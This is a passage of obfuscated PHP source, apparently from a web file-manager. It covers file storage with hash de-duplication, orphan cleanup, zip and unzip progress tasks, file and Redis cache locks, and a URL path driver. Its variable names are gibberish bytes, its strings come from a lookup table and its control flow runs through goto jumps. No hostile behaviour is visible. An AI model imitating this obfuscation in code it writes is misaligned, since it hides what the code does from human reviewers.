$_SERVER[Å¶¨Şêº]; if (!$ö©Ëèğ) { return !1; } $ö©Ëèğ[$°Üô‘ÂÂ[87]] = intval($ö©Ëèğ[$°Üô‘ÂÂ[87]]); if (!$ö©Ëèğ[$°Üô‘ÂÂ[87]] && strlen($ö©Ëèğ[$°Üô‘ÂÂ[188]]) > 32) { $ö©Ëèğ[$°Üô‘ÂÂ[87]] = intval(substr($ö©Ëèğ[$°Üô‘ÂÂ[188]], 32)); } $ÅşØÊ—Í = $this->add($ö©Ëèğ); return $this->find($ÅşØÊ—Í); } public function addFile($½¶’ûé€, $ßºÖ±£Ì, $Ï²’å·ç = false) { $ĞòÓ¶ª÷ =& $_SERVER[Å¶¨Şêº]; $ñåªÆŞ» = IO::hashSimple($½¶’ûé€); $´êÅÂïš = IO::size($½¶’ûé€); $§Ç®œÑ£ = $´êÅÂïš <= 1024 * 1024 * 10 ? IO::hashMd5($½¶’ûé€) : $ĞòÓ¶ª÷[12]; $ßÅª·Ğ‚ = $ĞòÓ¶ª÷[1916] . $ñåªÆŞ»; CacheLock::lock($ßÅª·Ğ‚); if ($§Ç®œÑ£ && $ñåªÆŞ») { $ø‡şÛ‘¡ = $this->addFileCheckExist($ñåªÆŞ», $§Ç®œÑ£, $´êÅÂïš); if ($ø‡şÛ‘¡) { CacheLock::unlock($ßÅª·Ğ‚); return $ø‡şÛ‘¡; } } $±é…”ì = $this->addFileMake($½¶’ûé€, $´êÅÂïš, $ñåªÆŞ», $§Ç®œÑ£, $ßºÖ±£Ì, $Ï²’å·ç); $ªÎ‚¢Ôæ = $this->addFileData($±é…”ì); CacheLock::unlock($ßÅª·Ğ‚); if (!$§Ç®œÑ£ && $ªÎ‚¢Ôæ) { $this->fileMd5Check($ªÎ‚¢Ôæ); } return $ªÎ‚¢Ôæ; } private function fileMd5Check($ÊáŒÍ) { $ç¾Ùß° =& $_SERVER[Å¶¨Şêº]; $¾³ğÛ›ç = array($ÊáŒÍ[$ç¾Ùß°[477]], $ÊáŒÍ[$ç¾Ùß°[95]]); $”ñîÉÖ = $ç¾Ùß°[1917] . $ÊáŒÍ[$ç¾Ùß°[95]]; $²æÏáŸİ = $ç¾Ùß°[1918] . $ÊáŒÍ[$ç¾Ùß°[477]]; $ÔóöªÏÙ = TaskQueue::add($ç¾Ùß°[1919], $¾³ğÛ›ç, $”ñîÉÖ, $²æÏáŸİ); if (!$ÔóöªÏÙ) { $this->fileMd5Set($ÊáŒÍ[$ç¾Ùß°[477]], $ÊáŒÍ[$ç¾Ùß°[95]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($ÏŸÖ’è·, $‘æ¨´ò´) { $«ñ¼Ÿ€ =& $_SERVER[Å¶¨Şêº]; $Çİìô£Š = $this->find($ÏŸÖ’è·); if (!$Çİìô£Š || $Çİìô£Š[$«ñ¼Ÿ€[187]]) { return; } $¶©È»î± = IO::hashMd5($‘æ¨´ò´); if (!$¶©È»î±) { return $«ñ¼Ÿ€[12]; } $this->where(array($«ñ¼Ÿ€[477] => $ÏŸÖ’è·))->save(array($«ñ¼Ÿ€[187] => $¶©È»î±)); } public function addFileMake($„²ôåë®, $ı“š…ä, $ï™¸åËº, $…ü­ğ, $Â›ÖäƒË, $â˜€õƒ) { $½ÌèˆßĞ =& $_SERVER[Å¶¨Şêº]; $à‡Ç’şÔ = $this->createFileName($Â›ÖäƒË, $ï™¸åËº, $…ü­ğ); $Íå•ª–ò = get_path_father($à‡Ç’şÔ); $ÜŞ—‹¾µ = get_path_this($à‡Ç’şÔ); if ($â˜€õƒ) { $ËèñªÛ = IO::move($„²ôåë®, $Íå•ª–ò, !1, $ÜŞ—‹¾µ); } else { $ËèñªÛ = IO::copy($„²ôåë®, $Íå•ª–ò, !1, $ÜŞ—‹¾µ); } if (!$ËèñªÛ) { return !1; } $ñƒŒÓ… = KodIO::defaultDriver(); $ºŸÈ–Ã¡ = array($½ÌèˆßĞ[554] => $ı“š…ä, $½ÌèˆßĞ[1913] => 1, $½ÌèˆßĞ[429] => $Â›ÖäƒË, $½ÌèˆßĞ[806] => $ñƒŒÓ…[$½ÌèˆßĞ[408]], $½ÌèˆßĞ[430] => $à‡Ç’şÔ, $½ÌèˆßĞ[1914] => $ï™¸åËº, $½ÌèˆßĞ[1915] => $…ü­ğ); return $ºŸÈ–Ã¡; } public function addFileCheckExist($Ñ¹Ø‚ƒî, $Ï™ŒÕèè, $êÓ¦İ·) { $¶×ø¬–º =& $_SERVER[Å¶¨Şêº]; $â¦œ€Ï = $this->findByHash($Ñ¹Ø‚ƒî, $Ï™ŒÕèè); if (!$â¦œ€Ï) { return !1; } $Şœ°¾ì = array($¶×ø¬–º[1913] => intval($â¦œ€Ï[$¶×ø¬–º[1920]]) + 1, $¶×ø¬–º[554] => $êÓ¦İ·); $this->where(array($¶×ø¬–º[478] => $â¦œ€Ï[$¶×ø¬–º[477]]))->save($Şœ°¾ì); return $â¦œ€Ï; } public function remove($‘»°ôİÍ) { $this->linkCountChange($‘»°ôİÍ, !1); $this->clearEmpty(); return !0; } public function linkAdd($óıìÜŠ) { $this->linkCountChange($óıìÜŠ, !0); } public function linkCountChange($â‹²ò¬—, $ˆş¾èû‘) { $ºŒÔá‘ñ =& $_SERVER[Å¶¨Şêº]; if (!$â‹²ò¬—) { return; } if (!is_array($â‹²ò¬—)) { $â‹²ò¬— = array($â‹²ò¬—); } $×Œè´ƒ = array(); foreach ($â‹²ò¬— as $¦Ôõö–³) { $÷Å¿õŸœ = $¦Ôõö–³ . $ºŒÔá‘ñ[12]; if (!$×Œè´ƒ[$÷Å¿õŸœ]) { $×Œè´ƒ[$÷Å¿õŸœ] = 0; } $×Œè´ƒ[$÷Å¿õŸœ]++; } $£„¡ÚÈ = array(); foreach ($×Œè´ƒ as $¦Ôõö–³ => $ÆµÈ¦Š…) { $÷Å¿õŸœ = $ÆµÈ¦Š… . $ºŒÔá‘ñ[12]; if (!$£„¡ÚÈ[$÷Å¿õŸœ]) { $£„¡ÚÈ[$÷Å¿õŸœ] = array(); } $£„¡ÚÈ[$÷Å¿õŸœ][] = $¦Ôõö–³; } foreach ($£„¡ÚÈ as $ÆµÈ¦Š… => $ÔŸÒù˜¿) { if (!$ÔŸÒù˜¿) { continue; } $ÆµÈ¦Š… = $ˆş¾èû‘ ? $ÆµÈ¦Š… : -intval($ÆµÈ¦Š…); $ä´·Ññ® = array($ºŒÔá‘ñ[477] => array($ºŒÔá‘ñ[7], $ÔŸÒù˜¿)); if ($ÆµÈ¦Š… < 0) { $ä´·Ññ®[$ºŒÔá‘ñ[1920]] = array($ºŒÔá‘ñ[1012], abs($ÆµÈ¦Š…)); } $this->where($ä´·Ññ®)->setAdd($ºŒÔá‘ñ[1920], $ÆµÈ¦Š…); } } public function findByHash($üÈ©˜”…, $ÑÂòŠµ = false) { $‘·õÑ‘† =& $_SERVER[Å¶¨Şêº]; if (!$üÈ©˜”… && !$ÑÂòŠµ) { return !1; } $¾û¦±Ë¾ = array($‘·õÑ‘†[1914] => $üÈ©˜”…); if ($ÑÂòŠµ) { $¾û¦±Ë¾ = array($‘·õÑ‘†[1915] => $ÑÂòŠµ); } return $this->order($‘·õÑ‘†[1921])->where($¾û¦±Ë¾)->find(); } public function clearEmpty($³·ÆòŒĞ = 0) { $µ¡¿¡ğÈ =& $_SERVER[Å¶¨Şêº]; $¶è£Ì¦ = time() - 3600 * 24 * $³·ÆòŒĞ; $ù½°÷‹š = $µ¡¿¡ğÈ[1922] . $¶è£Ì¦; $ß½ã‰ìØ = $this->where($ù½°÷‹š)->select(); if (!$ß½ã‰ìØ) { return; } $ç€¯ÅÕ» = new Task($µ¡¿¡ğÈ[1923], $µ¡¿¡ğÈ[12], count($ß½ã‰ìØ)); foreach ($ß½ã‰ìØ as $±Ú¹÷×) { $ç€¯ÅÕ»->update(1); $this->resetFile($±Ú¹÷×); } $ç€¯ÅÕ»->end(); } public function resetFile($ğß¥å€—) { $ï „Ê =& $_SERVER[Å¶¨Şêº]; $ª©Ñ‰¸´ = array($ï „Ê[478] => $ğß¥å€—[$ï „Ê[477]]); $ê÷™”¤ = Model($ï „Ê[1337])->where($ª©Ñ‰¸´)->count(); $†õÈ™“ = Model($ï „Ê[1924])->where($ª©Ñ‰¸´)->count(); $ñğ’ª€î = intval($ê÷™”¤) + intval($†õÈ™“); if ($ñğ’ª€î == 0) { IO::remove($ğß¥å€—[$ï „Ê[95]]); Model($ï „Ê[1925])->delete($ğß¥å€—[$ï „Ê[477]]); $this->where($ª©Ñ‰¸´)->delete(); $this->metaSet($ğß¥å€—[$ï „Ê[477]], null, null); return; } if ($ğß¥å€—[$ï „Ê[1920]] != $ñğ’ª€î) { $this->where($ª©Ñ‰¸´)->save(array($ï „Ê[1913] => $ñğ’ª€î)); } } public function storageInfo($‘µ²¼‰Ô = false) { $àêÚ‘Ğâ =& $_SERVER[Å¶¨Şêº]; $…†±³Ôë = $this->count() + 0.0; $ÁšŞş• = 0; $Á¤«¡‰ = 1; $òşôµ¹ = 0; $ßÆÄ°±ö = 5000; for ($ååÁõ¦È = 0; $ååÁõ¦È < $…†±³Ôë; $ååÁõ¦È = $ååÁõ¦È + $ßÆÄ°±ö) { $¶¾¹Ì­³ = $this->limit($ååÁõ¦È, $ååÁõ¦È + $ßÆÄ°±ö)->select(); foreach ($¶¾¹Ì­³ as $®‡ˆÂÁŸ) { $Á¤«¡‰ += $®‡ˆÂÁŸ[$àêÚ‘Ğâ[87]] * $®‡ˆÂÁŸ[$àêÚ‘Ğâ[1920]]; $ÁšŞş• += $®‡ˆÂÁŸ[$àêÚ‘Ğâ[87]] * ($®‡ˆÂÁŸ[$àêÚ‘Ğâ[1920]] - 1); $òşôµ¹ += $®‡ˆÂÁŸ[$àêÚ‘Ğâ[1920]]; } } $çÆìñªš = array($àêÚ‘Ğâ[1926] => $Á¤«¡‰, $àêÚ‘Ğâ[1927] => $ÁšŞş•, $àêÚ‘Ğâ[1928] => $ÁšŞş• / $Á¤«¡‰, $àêÚ‘Ğâ[91] => $…†±³Ôë, $àêÚ‘Ğâ[1929] => $òşôµ¹); return $çÆìñªš; } } goto C•Æ—¡åÜñ; EŞô¨‹‘”º: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ã÷“Õ„, $Œ†×“·á = 5.0) { if (!$ã÷“Õ„) { return; } $–á´äÕ± = Cache::get($ã÷“Õ„); if (!$–á´äÕ± || timeFloat() - floatVal($–á´äÕ±) >= $Œ†×“·á) { Cache::set($ã÷“Õ„, timeFloat(), $Œ†×“·á * 10); return !0; } return !1; } public static function timeLimitCall($«¸ˆ„ı¾, $Ìå¤Äíœ, $Éæµä€Î, $òä›ùéÖ = 5.0) { $Ùœ‡Ÿ¢Ë =& $_SERVER[Å¶¨Şêº]; if (!$«¸ˆ„ı¾ || !$Ìå¤Äíœ) { return; } self::$asyncAdd = !0; $ôËŞÛ = $Ùœ‡Ÿ¢Ë[1766]; $¦¢À¯€€ = Cache::get($ôËŞÛ, !0); $Ü×¾èÑ‘ = array($Ùœ‡Ÿ¢Ë[1767] => timeFloat(), $Ùœ‡Ÿ¢Ë[1768] => timeFloat(), $Ùœ‡Ÿ¢Ë[274] => $Ìå¤Äíœ, $Ùœ‡Ÿ¢Ë[1761] => $Éæµä€Î, $Ùœ‡Ÿ¢Ë[191] => $òä›ùéÖ); if (is_array($¦¢À¯€€[$«¸ˆ„ı¾])) { $Ü×¾èÑ‘[$Ùœ‡Ÿ¢Ë[1768]] = $¦¢À¯€€[$«¸ˆ„ı¾][$Ùœ‡Ÿ¢Ë[1768]]; } if (is_array($¦¢À¯€€[$«¸ˆ„ı¾])) { if (timeFloat() - $¦¢À¯€€[$«¸ˆ„ı¾][$Ùœ‡Ÿ¢Ë[1767]] < $Ü×¾èÑ‘[$Ùœ‡Ÿ¢Ë[191]] * 0.3) { return; } $Ü×¾èÑ‘[$Ùœ‡Ÿ¢Ë[1768]] = $¦¢À¯€€[$«¸ˆ„ı¾][$Ùœ‡Ÿ¢Ë[1768]]; } $¦¢À¯€€[$«¸ˆ„ı¾] = $Ü×¾èÑ‘; Cache::set($ôËŞÛ, $¦¢À¯€€, 60); Cache::removeMemory($ôËŞÛ); write_log($Ùœ‡Ÿ¢Ë[1769] . $«¸ˆ„ı¾ . $Ùœ‡Ÿ¢Ë[82] . $Ìå¤Äíœ, $Ùœ‡Ÿ¢Ë[1763]); } public static function timeLimitCallLoop() { $ëæû¦˜™ =& $_SERVER[Å¶¨Şêº]; $šêìÖøÇ = array($ëæû¦˜™[1770]); $¢ÀÓ°êŞ = in_array(strtolower(ACTION), $šêìÖøÇ); if (!$¢ÀÓ°êŞ && !self::$asyncAdd) { return; } $Â–íìîš = $ëæû¦˜™[1766]; $ç “Õç = Cache::get($Â–íìîš, !0); if (!$ç “Õç || count($ç “Õç) <= 0) { return; } $Ş½®Ë = !1; $ØÍÎÙ = timeFloat(); $€«ŠÁĞ„ = array(); foreach ($ç “Õç as $¬÷‹³™ => $¸½Ôî¥) { if ($ØÍÎÙ - $¸½Ôî¥[$ëæû¦˜™[1768]] > $¸½Ôî¥[$ëæû¦˜™[191]]) { $Ş½®Ë = !0; try { Hook::apply($¸½Ôî¥[$ëæû¦˜™[274]], $¸½Ôî¥[$ëæû¦˜™[1761]]); write_log($ëæû¦˜™[1771] . $¬÷‹³™ . $ëæû¦˜™[82] . $¸½Ôî¥[$ëæû¦˜™[274]] . $ëæû¦˜™[1772] . ACTION, $ëæû¦˜™[1763]); } catch (Exception $òÌš©ï) { } continue; } $€«ŠÁĞ„[$¬÷‹³™] = $¸½Ôî¥; } if (!$Ş½®Ë) { return; } if (!$€«ŠÁĞ„) { return Cache::remove($Â–íìîš); } Cache::set($Â–íìîš, $€«ŠÁĞ„, 60); Cache::removeMemory($Â–íìîš); } public static function finished($şŸè¢¢È, $Á¢ôÖ¬–) { $´ü­éÜ =& $_SERVER[Å¶¨Şêº]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($´ü­éÜ[274] => $şŸè¢¢È, $´ü­éÜ[1761] => $Á¢ôÖ¬–); } private static function finishedRun() { $•è—µ‰ =& $_SERVER[Å¶¨Şêº]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Ñ½ŞÉ‹İ) { try { Hook::apply($Ñ½ŞÉ‹İ[$•è—µ‰[274]], $Ñ½ŞÉ‹İ[$•è—µ‰[1761]]); } catch (Exception $öøÖôú) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $îıšÍşÔ =& $_SERVER[Å¶¨Şêº]; parent::startAfter(); Hook::bind($îıšÍşÔ[1773], array($this, $îıšÍşÔ[1774])); Hook::bind($îıšÍşÔ[1191], array($this, $îıšÍşÔ[1775])); $Áè„¡©â =& $this->task; $Áè„¡©â[$îıšÍşÔ[1776]] = $îıšÍşÔ[1192]; if (!$Áè„¡©â[$îıšÍşÔ[1563]]) { $Áè„¡©â[$îıšÍşÔ[1563]] = LNG($îıšÍşÔ[1777]); } } protected function endAfter() { $¹ñÆÍÃê =& $_SERVER[Å¶¨Şêº]; parent::endAfter(); Hook::unbind($¹ñÆÍÃê[1773], array($this, $¹ñÆÍÃê[1774])); Hook::unbind($¹ñÆÍÃê[1191], array($this, $¹ñÆÍÃê[1775])); } public function updateAfter() { $â®í‡à =& $_SERVER[Å¶¨Şêº]; $ÎÑÍâ =& $this->task; if (!$ÎÑÍâ[$â®í‡à[784]] || !$ÎÑÍâ[$â®í‡à[761]]) { return; } if ($ÎÑÍâ[$â®í‡à[1776]] == $â®í‡à[1192]) { $ì›ºÄ¹¿ = 0; if ($ÎÑÍâ[$â®í‡à[1716]]) { $ì›ºÄ¹¿ = $ÎÑÍâ[$â®í‡à[1717]] / $ÎÑÍâ[$â®í‡à[1716]]; } $ÎÑÍâ[$â®í‡à[1665]] = $ì›ºÄ¹¿ * 0.3; } else { if ($ÎÑÍâ[$â®í‡à[1776]] == $â®í‡à[323]) { $ì›ºÄ¹¿ = $ÎÑÍâ[$â®í‡à[1664]] / $ÎÑÍâ[$â®í‡à[784]]; $ÎÑÍâ[$â®í‡à[1665]] = 0.3 + $ì›ºÄ¹¿ * 0.4; } else { if ($ÎÑÍâ[$â®í‡à[1776]] == $â®í‡à[118]) { $†úØƒîñ = 0; if ($ÎÑÍâ[$â®í‡à[1718]] == $â®í‡à[118]) { $†úØƒîñ = $ÎÑÍâ[$â®í‡à[1717]]; } $ì›ºÄ¹¿ = ($ÎÑÍâ[$â®í‡à[1721]] + $†úØƒîñ) / $ÎÑÍâ[$â®í‡à[761]]; $ÎÑÍâ[$â®í‡à[1665]] = 0.3 + 0.4 + $ì›ºÄ¹¿ * 0.3; } } } if ($ÎÑÍâ[$â®í‡à[1665]] > 0) { $ó¨·ô—¬ = timeFloat() - $ÎÑÍâ[$â®í‡à[1667]] - $ÎÑÍâ[$â®í‡à[1670]]; $ÎÑÍâ[$â®í‡à[1671]] = $ó¨·ô—¬ * (1 - $ÎÑÍâ[$â®í‡à[1665]]) / $ÎÑÍâ[$â®í‡à[1665]]; } } public function addFile($ï—º’¤) { $£êëØ£á =& $_SERVER[Å¶¨Şêº]; $â¾ß«í =& $this->task; $˜‘…şŒÌ = IO::info($ï—º’¤); $â¾ß«í[$£êëØ£á[1714]] = $˜‘…şŒÌ[$£êëØ£á[42]]; $â¾ß«í[$£êëØ£á[1716]] = $˜‘…şŒÌ[$£êëØ£á[87]]; $â¾ß«í[$£êëØ£á[1717]] = 0; $â¾ß«í[$£êëØ£á[1061]] = $£êëØ£á[1737]; $â¾ß«í[$£êëØ£á[1718]] = $£êëØ£á[1192]; $â¾ß«í[$£êëØ£á[761]] = $˜‘…şŒÌ[$£êëØ£á[87]]; $â¾ß«í[$£êëØ£á[784]] = 1; $æ”†¼µŒ = 0; $â¾ß«í[$£êëØ£á[1725]] = array($£êëØ£á[1726] => $æ”†¼µŒ + 1, $£êëØ£á[429] => $˜‘…şŒÌ[$£êëØ£á[42]], $£êëØ£á[95] => $˜‘…şŒÌ[$£êëØ£á[95]], $£êëØ£á[518] => $˜‘…şŒÌ[$£êëØ£á[518]] ? $˜‘…şŒÌ[$£êëØ£á[518]] : $˜‘…şŒÌ[$£êëØ£á[95]]); $this->update(); } public function unzipAfter($Â’Îª°—) { $ª—é¬õê =& $_SERVER[Å¶¨Şêº]; $œôóâ‘Å =& $this->task; $œôóâ‘Å[$ª—é¬õê[1776]] = $ª—é¬õê[118]; $şû¦õß¢ = IO::infoWithChildren($Â’Îª°—); $óèïşÇç = 0; $œôóâ‘Å[$ª—é¬õê[1725]] = array($ª—é¬õê[1726] => $óèïşÇç + 1, $ª—é¬õê[429] => $şû¦õß¢[$ª—é¬õê[42]], $ª—é¬õê[95] => $şû¦õß¢[$ª—é¬õê[95]], $ª—é¬õê[518] => $şû¦õß¢[$ª—é¬õê[518]] ? $şû¦õß¢[$ª—é¬õê[518]] : $şû¦õß¢[$ª—é¬õê[95]]); if ($şû¦õß¢[$ª—é¬õê[43]] == $ª—é¬õê[211]) { $œôóâ‘Å[$ª—é¬õê[784]] = 1; } else { $œôóâ‘Å[$ª—é¬õê[784]] = $şû¦õß¢[$ª—é¬õê[90]][$ª—é¬õê[88]]; } $œôóâ‘Å[$ª—é¬õê[1061]] = $ª—é¬õê[12]; $œôóâ‘Å[$ª—é¬õê[1718]] = 0; $œôóâ‘Å[$ª—é¬õê[1664]] = 0; $œôóâ‘Å[$ª—é¬õê[1716]] = 0; $œôóâ‘Å[$ª—é¬õê[1717]] = 0; $œôóâ‘Å[$ª—é¬õê[1714]] = $ª—é¬õê[12]; $œôóâ‘Å[$ª—é¬õê[1721]] = 0; $œôóâ‘Å[$ª—é¬õê[761]] = $şû¦õß¢[$ª—é¬õê[87]]; $this->update(); self::log($ª—é¬õê[1778] . json_encode(array($œôóâ‘Å, $şû¦õß¢))); } public function nameParse($Ù¿Ùç¬£) { $Õ¦òğÕ• =& $_SERVER[Å¶¨Şêº]; $¥¼¸óœ¯ =& $this->task; if ($¥¼¸óœ¯[$Õ¦òğÕ•[1776]] == $Õ¦òğÕ•[1192]) { $¥¼¸óœ¯[$Õ¦òğÕ•[1776]] = $Õ¦òğÕ•[323]; $¥¼¸óœ¯[$Õ¦òğÕ•[1721]] = 0; $¥¼¸óœ¯[$Õ¦òğÕ•[761]] = 0; } $×Ê˜•„ = get_path_this($Ù¿Ùç¬£); if (strstr($×Ê˜•„, $Õ¦òğÕ•[10])) { $¥¼¸óœ¯[$Õ¦òğÕ•[1664]] += 1; $¥¼¸óœ¯[$Õ¦òğÕ•[784]] += 1; } $¥¼¸óœ¯[$Õ¦òğÕ•[1714]] = $Ù¿Ùç¬£; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $¹–™úçû =& $_SERVER[Å¶¨Şêº]; parent::startAfter(); Hook::bind($¹–™úçû[1779], array($this, $¹–™úçû[1774])); $Ü¿ŞúÁ =& $this->task; $Ü¿ŞúÁ[$¹–™úçû[1776]] = $¹–™úçû[1192]; if (!$Ü¿ŞúÁ[$¹–™úçû[1563]]) { $Ü¿ŞúÁ[$¹–™úçû[1563]] = LNG($¹–™úçû[1780]); } } protected function endAfter() { $Ëƒ Îó =& $_SERVER[Å¶¨Şêº]; parent::endAfter(); Hook::unbind($Ëƒ Îó[1779], array($this, $Ëƒ Îó[1774])); } public function updateAfter() { $ïàì¯“ =& $_SERVER[Å¶¨Şêº]; $¦¢›¡»© =& $this->task; if (!$¦¢›¡»©[$ïàì¯“[784]] || !$¦¢›¡»©[$ïàì¯“[761]]) { return; } if ($¦¢›¡»©[$ïàì¯“[1776]] == $ïàì¯“[1192]) { $œ°Œî¡Ä = $¦¢›¡»©[$ïàì¯“[1717]]; if ($¦¢›¡»©[$ïàì¯“[1718]] != $ïàì¯“[1192]) { $œ°Œî¡Ä = 0; } $ŒéÃ¢˜µ = ($¦¢›¡»©[$ïàì¯“[1721]] + $œ°Œî¡Ä) / $¦¢›¡»©[$ïàì¯“[761]]; $¦¢›¡»©[$ïàì¯“[1665]] = $ŒéÃ¢˜µ * 0.3; } else { if ($¦¢›¡»©[$ïàì¯“[1776]] == $ïàì¯“[323]) { $ŒéÃ¢˜µ = $¦¢›¡»©[$ïàì¯“[1664]] / $¦¢›¡»©[$ïàì¯“[784]]; $¦¢›¡»©[$ïàì¯“[1665]] = 0.3 + $ŒéÃ¢˜µ * 0.5; } else { if ($¦¢›¡»©[$ïàì¯“[1776]] == $ïàì¯“[118]) { $ŒéÃ¢˜µ = 0; if ($¦¢›¡»©[$ïàì¯“[1716]]) { $ŒéÃ¢˜µ = $¦¢›¡»©[$ïàì¯“[1717]] / $¦¢›¡»©[$ïàì¯“[1716]]; } $¦¢›¡»©[$ïàì¯“[1665]] = 0.3 + 0.5 + $ŒéÃ¢˜µ * 0.2; } } } if ($¦¢›¡»©[$ïàì¯“[1665]] > 0) { $äò¡éú = timeFloat() - $¦¢›¡»©[$ïàì¯“[1667]] - $¦¢›¡»©[$ïàì¯“[1670]]; $¦¢›¡»©[$ïàì¯“[1671]] = $äò¡éú * (1 - $¦¢›¡»©[$ïàì¯“[1665]]) / $¦¢›¡»©[$ïàì¯“[1665]]; } } public function copyFileStart($Úßä¶ú½, $ÙãÛÆÄˆ, $º”Îœİº, $Ëê³ŸÀ¿, $‰®ÄŠ¬¬, $ßÀÓ·ªè) { $£÷–ïš„ =& $_SERVER[Å¶¨Şêº]; parent::copyFileStart($Úßä¶ú½, $ÙãÛÆÄˆ, $º”Îœİº, $Ëê³ŸÀ¿, $‰®ÄŠ¬¬, $ßÀÓ·ªè); $í“òĞŒË =& $this->task; if ($í“òĞŒË[$£÷–ïš„[1776]] == $£÷–ïš„[323]) { $í“òĞŒË[$£÷–ïš„[1776]] = $£÷–ïš„[118]; } $this->update(); } public function copyFileEnd($ÜğóŒÏ’, $»°²©†, $ç¿„£™ä, $Íìåœï³, $ğÏ‚’À, $‚‘Å‰†­) { $ÂÓ–¦Ì =& $_SERVER[Å¶¨Şêº]; $Ëó«õÕ =& $this->task; $Ëó«õÕ[$ÂÓ–¦Ì[1717]] = $Ëó«õÕ[$ÂÓ–¦Ì[1716]]; $Ëó«õÕ[$ÂÓ–¦Ì[1721]] += $Ëó«õÕ[$ÂÓ–¦Ì[1716]]; $Ëó«õÕ[$ÂÓ–¦Ì[1718]] = $ÂÓ–¦Ì[12]; $this->update(); } public function nameParse($êğÚ†) { $Á—öÈáÜ =& $_SERVER[Å¶¨Şêº]; $İÎÊÑ²Ç =& $this->task; if ($İÎÊÑ²Ç[$Á—öÈáÜ[1664]] < $İÎÊÑ²Ç[$Á—öÈáÜ[784]]) { $æ¹Æ‰³‹ = get_path_this($êğÚ†); if (strstr($æ¹Æ‰³‹, $Á—öÈáÜ[10])) { $İÎÊÑ²Ç[$Á—öÈáÜ[1664]] += 1; } } if ($İÎÊÑ²Ç[$Á—öÈáÜ[1776]] == $Á—öÈáÜ[1192]) { $İÎÊÑ²Ç[$Á—öÈáÜ[1776]] = $Á—öÈáÜ[323]; } $İÎÊÑ²Ç[$Á—öÈáÜ[1714]] = $êğÚ†; $this->update(); } } goto BÀğ¯ôÖ´; e–ÃÃ Áò¹: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ÍŸ×Àüò =& $_SERVER[Å¶¨Şêº]; $Ô»ŒÏäÚ = $GLOBALS[$ÍŸ×Àüò[6]][$ÍŸ×Àüò[359]]; self::$cachePath = $Ô»ŒÏäÚ[$ÍŸ×Àüò[211]][$ÍŸ×Àüò[95]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($‘ò³Ñ™, $ÜØÚø£¤ = 0) { $½×”ûÓ¿ =& $_SERVER[Å¶¨Şêº]; $ìåéÓ…Ö = microtime(!0); $ëü‡á´ò = $ìåéÓ…Ö + $ÜØÚø£¤ + 0.0001; $Ö”Ô‹·¢ = rtrim(self::$cachePath, $½×”ûÓ¿[8]) . $½×”ûÓ¿[861] . md5($‘ò³Ñ™) . $½×”ûÓ¿[858]; if (file_exists($Ö”Ô‹·¢) && filemtime($Ö”Ô‹·¢) && filemtime($Ö”Ô‹·¢) < time() - 10) { @unlink($Ö”Ô‹·¢); } do { if (file_exists($Ö”Ô‹·¢)) { cacheLockWait(); continue; } $£¦ş²÷ = fopen($Ö”Ô‹·¢, $½×”ûÓ¿[862]); if (!$£¦ş²÷) { return !1; } $€¹±…è² = flock($£¦ş²÷, LOCK_EX | LOCK_NB); self::$caches[$‘ò³Ñ™] = array($½×”ûÓ¿[863] => $£¦ş²÷, $½×”ûÓ¿[211] => $Ö”Ô‹·¢); fwrite($£¦ş²÷, $ëü‡á´ò); clearstatcache(); if ($£¦ş²÷ && $€¹±…è²) { return !0; } cacheLockWait(); } while (microtime(!0) < $ëü‡á´ò); $this->unlock($‘ò³Ñ™); return !1; } public function lockGet($æÜÉóºÄ) { $ï÷¯ÄŒİ =& $_SERVER[Å¶¨Şêº]; $€·È‰ùÓ = rtrim(self::$cachePath, $ï÷¯ÄŒİ[8]) . $ï÷¯ÄŒİ[861] . md5($æÜÉóºÄ) . $ï÷¯ÄŒİ[858]; return file_exists($€·È‰ùÓ); } public function unlock($¹…Û•Í±) { $ªÔ–éÔÀ =& $_SERVER[Å¶¨Şêº]; $øÕÇÏığ = self::$caches[$¹…Û•Í±]; if (!$øÕÇÏığ) { return; } @flock($øÕÇÏığ[$ªÔ–éÔÀ[863]], LOCK_UN); @fclose($øÕÇÏığ[$ªÔ–éÔÀ[863]]); @unlink($øÕÇÏığ[$ªÔ–éÔÀ[211]]); unset(self::$caches[$¹…Û•Í±]); } } class CacheLockRedis { public function lock($ÂöÛ˜®’, $âÈøÖˆ = 10) { $ÉÎÍâ÷ñ = Cache::init(); $†İó÷ä = microtime(!0) + $âÈøÖˆ; while (microtime(!0) < $†İó÷ä) { $‚è›öõ‘ = $ÉÎÍâ÷ñ->get($ÂöÛ˜®’); if (!$‚è›öõ‘) { $ñ¡»½² = $ÉÎÍâ÷ñ->setLock($ÂöÛ˜®’, $†İó÷ä, $âÈøÖˆ); if ($ñ¡»½²) { return !0; } } else { if ($‚è›öõ‘ < microtime(!0)) { $ÉÎÍâ÷ñ->set($ÂöÛ˜®’, $†İó÷ä, $âÈøÖˆ * 2); if ($ÉÎÍâ÷ñ->get($ÂöÛ˜®’) === $‚è›öõ‘) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Íõİùêğ) { return Cache::init()->get($Íõİùêğ); } public function unlock($ªÀÅş…Ú) { return Cache::init()->remove($ªÀÅş…Ú); } } goto B¡˜óŒ¯¸‹; aÅíÈ«ŞÉÂ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ûÜöÓ = false) { } public function exist($•½µëöÎ) { $èßÀæÑ‘ = $this->info($•½µëöÎ); return $èßÀæÑ‘[$_SERVER[Å¶¨Şêº][213]]; } public function isFile($±†£Éä²) { $ÒË§ƒ„Ş = $this->info($±†£Éä²); return $ÒË§ƒ„Ş[$_SERVER[Å¶¨Şêº][213]]; } public function isFolder($È´Ú·Û¸) { return !1; } public function size($ú¼ˆó‡) { $ƒ¢™Ğ¢Ï = $this->info($ú¼ˆó‡); return $ƒ¢™Ğ¢Ï[$_SERVER[Å¶¨Şêº][87]]; } public function info($¾¨¤¦ö) { return $this->infoParse($¾¨¤¦ö); } public function infoAuth($œ±ƒ ¼¼) { return $this->infoParse($œ±ƒ ¼¼); } public function infoWithChildren($Ûäò“µ€) { return $this->infoParse($Ûäò“µ€); } public function 